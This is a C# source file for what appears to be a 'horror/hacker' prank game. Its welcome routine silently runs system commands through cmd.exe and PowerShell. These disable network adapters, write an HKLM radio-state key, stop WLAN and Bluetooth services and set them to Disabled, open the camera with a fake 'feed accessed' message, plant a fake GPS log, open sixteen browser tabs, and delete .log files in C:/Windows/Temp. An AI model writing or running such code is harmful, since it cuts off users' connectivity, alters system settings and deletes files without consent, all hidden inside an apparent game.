using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Cara.Fx;

/// System-level "horror/hacker" routines, ported 1:1 from main.cpp.
/// WARNING: these really touch the machine (network, registry, camera,
/// shutdown). Faithful to the original C++ behavior.
public static class SystemFx
{
    private static readonly Random Rng = new();

    // Equivalent of C's system(): run a command through cmd.exe and wait.
    private static int Run(string command)
    {
        try
        {
            using var p = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command) { UseShellExecute = false });
            p!.WaitForExit();
            return p.ExitCode;
        }
        catch { return -1; }
    }

    private static void AppendLog(string path, string line)
    {
        try
        {
            string? dir = Path.GetDirectoryName(path);
            if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
            File.AppendAllText(path, line + "\n");
        }
        catch { }
    }

    private static bool FileExists(string path) => File.Exists(path);

    public static void ExecuteWelcomeSequence()
    {
        ExecuteSpectralBroadcast();
        TriggerPhantomProtocol();
        InitiateBlackMirror();

        Cara.Minigames.MinigameMenu.Run();

        Console.WriteLine("[System] All systems engaged. Game parameters initialized.");
        Run("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    }

    public static void FixMe() => Run("\"resources\\data\\secure\\guardian_angel.bat\"");

    public static void EnableAirplaneMode()
    {
        const string log = "resources/logs/airplane_log.txt";

        int regResult = Run("powershell -Command \"Try {   $regPath = 'HKLM:/SYSTEM/CurrentControlSet/Control/RadioManagement/SystemRadioState';   if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null };   Set-ItemProperty -Path $regPath -Name 'SystemRadioState' -Value 1 -Force -ErrorAction Stop;   Write-Output '[SUCCESS] Registry updated';   Exit 0;} Catch {   Write-Output ('[ERROR] ' + $_.Exception.Message);   Exit 1;}\"");
        AppendLog(log, "Registry update result: " + regResult);

        foreach (var iface in new[] { "Wi-Fi", "Bluetooth Network Connection", "Ethernet" })
        {
            int r = Run($"netsh interface set interface \"{iface}\" admin=disable");
            AppendLog(log, iface + " disable: " + r);
        }

        Run("powershell -Command \"Get-Service -Name 'WlanSvc', 'BthServ' | Stop-Service -Force -PassThru -ErrorAction SilentlyContinue | Set-Service -StartupType Disabled -PassThru | Out-File -Append resources/logs/airplane_log.txt\"");
    }

    public static void ActivateBluetooth()
    {
        const string devconPath = "resources/Tools/devcon.exe";
        string toolPath = "\"" + devconPath + "\"";
        const string log = "resources/logs/bluetooth_log.txt";

        if (!FileExists(devconPath))
        {
            AppendLog(log, "ERROR: devcon.exe not found at: " + toolPath);
            return;
        }

        var commands = new[]
        {
            toolPath + " enable *DEV_0A12*",
            toolPath + " enable *USB\\VID_0A12*",
            toolPath + " rescan",
            "powershell -Command \"Start-Service -Name 'BthServ' -ErrorAction SilentlyContinue;Start-Service -Name 'BTAGService' -ErrorAction SilentlyContinue;Start-Sleep -Seconds 3;Add-BluetoothDevice -Name '*' -ErrorAction SilentlyContinue | Out-File -Append " + log + "\""
        };

        foreach (var cmd in commands)
        {
            AppendLog(log, "Executing: " + cmd);
            int r = Run(cmd);
            AppendLog(log, "Result: " + r);
        }

        Run("netsh interface set interface \"Bluetooth Network Connection\" admin=enable");
    }

    private static void PlayMp3(string filename)
    {
        mciSendStringA("close mp3file", null, 0, IntPtr.Zero);
        int err = mciSendStringA($"open \"{filename}\" type mpegvideo alias mp3file", null, 0, IntPtr.Zero);
        if (err != 0) { ShowMciError(err); return; }
        err = mciSendStringA("play mp3file repeat", null, 0, IntPtr.Zero);
        if (err != 0) ShowMciError(err);
    }

    private static void ShowMciError(int err)
    {
        var buf = new StringBuilder(128);
        mciGetErrorStringA(err, buf, buf.Capacity);
        MessageBoxA(IntPtr.Zero, buf.ToString(), "Audio Error", 0x10);
    }

    private static void PlayCreepyAudio()
    {
        const string soundPath = "resources/audio/c1337.mp3";
        if (FileExists(soundPath))
        {
            PlayMp3(soundPath);
            mciSendStringA("status mp3file length", null, 0, IntPtr.Zero);
        }
        else
        {
            for (int i = 0; i < 5; i++)
            {
                Console.Beep(300 + i * 100, 200);
                Run("color 0C");
                Console.Beep(1500 - i * 100, 200);
                Run("color 07");
            }
        }
    }

    public static void ExecuteSpectralBroadcast()
    {
        for (int i = 0; i < 5; i++)
        {
            Run("color 0A"); Thread.Sleep(50);
            Run("color 0C"); Thread.Sleep(50);
        }
        Run("color 07");
        Run("netsh interface set interface \"Wi-Fi\" admin=disable");
        Run("start microsoft.windows.camera:");
        Console.WriteLine("\n[!] Camera feed accessed");
        PlayCreepyAudio();
        Run("powershell -Command \"(New-Object Media.SoundPlayer 'C:/Windows/Media/Windows Background.wav').PlaySync();\"");

        try
        {
            File.WriteAllText("C:/Windows/Temp/location.log",
                "Last known coordinates:\n" +
                "Latitude: 49.8178351179526° N\n" +
                "Longitude: 19.05101757884222° E\n" +
                "Timestamp: " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "\n" +
                "Accuracy: ±3m\n" +
                "Source: GPS spoofing module\n");
        }
        catch { }
    }

    public static void TriggerPhantomProtocol()
    {
        for (int i = 1; i <= 16; i++)
            Run("start https://void.domain/N0T-4-TR4P-" + i + "?seed=" + Environment.TickCount64);

        Run("start /B cmd /c \"timeout 37 && del /Q C:/Windows/Temp/*.log\"");
    }

    public static void InitiateBlackMirror()
    {
        IntPtr hConsole = GetStdHandle(-11);
        GetConsoleScreenBufferInfo(hConsole, out CONSOLE_SCREEN_BUFFER_INFO csbi);

        Console.Clear();
        Console.WriteLine("INITIALIZING SPECTRAL INTERFACE");
        for (int i = 0; i < 150; i++)
        {
            SetConsoleTextAttribute(hConsole, (ushort)Rng.Next(0, 256));
            if (i % 10 == 0) { Console.Clear(); Console.WriteLine("SYSTEM INTEGRITY COMPROMISED"); }
            for (int j = 0; j < 80; j++) Console.Write((char)(Rng.Next(0, 94) + 33));
            Console.Write("\n");
            Console.Beep(Rng.Next(37, 2037), 50);
            if (i > 100) Thread.Sleep(10);
            else if (i > 50) Thread.Sleep(30);
            else Thread.Sleep(50);
        }

        SetConsoleTextAttribute(hConsole, csbi.wAttributes);
        Console.Clear();
        EnableAirplaneMode();
        ActivateBluetooth();
        Run("powershell -Command \"Try {   $state = Get-ItemPropertyValue 'HKLM:/SYSTEM/CurrentControlSet/Control/RadioManagement/SystemRadioState' -Name 'SystemRadioState';    if ($state -ne 1) { Write-Error 'Airplane mode failed!' }; } Catch {    Write-Error 'Verification failed: ' + $_.Exception.Message; }\"");
        Run("color 0F");
        for (int i = 0; i < 3; i++)
        {
            Run("color 0F"); Console.Beep(1500, 100);
            Run("color 0"); Console.Beep(300, 100);
        }
        Run("color 07");
    }

    // ---- native -------------------------------------------------------------

    [StructLayout(LayoutKind.Sequential)]
    private struct COORD { public short X, Y; }

    [StructLayout(LayoutKind.Sequential)]
    private struct SMALL_RECT { public short Left, Top, Right, Bottom; }

    [StructLayout(LayoutKind.Sequential)]
    private struct CONSOLE_SCREEN_BUFFER_INFO
    {
        public COORD dwSize;
        public COORD dwCursorPosition;
        public ushort wAttributes;
        public SMALL_RECT srWindow;
        public COORD dwMaximumWindowSize;
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]
    private static extern bool GetConsoleScreenBufferInfo(IntPtr hConsoleOutput, out CONSOLE_SCREEN_BUFFER_INFO info);

    [DllImport("kernel32.dll")]
    private static extern bool SetConsoleTextAttribute(IntPtr hConsoleOutput, ushort wAttributes);

    [DllImport("winmm.dll", CharSet = CharSet.Ansi)]
    private static extern int mciSendStringA(string command, StringBuilder? returnValue, int returnLength, IntPtr hwndCallback);

    [DllImport("winmm.dll", CharSet = CharSet.Ansi)]
    private static extern int mciGetErrorStringA(int errorCode, StringBuilder errorText, int errorTextSize);

    [DllImport("user32.dll", CharSet = CharSet.Ansi)]
    private static extern int MessageBoxA(IntPtr hWnd, string text, string caption, uint type);
}
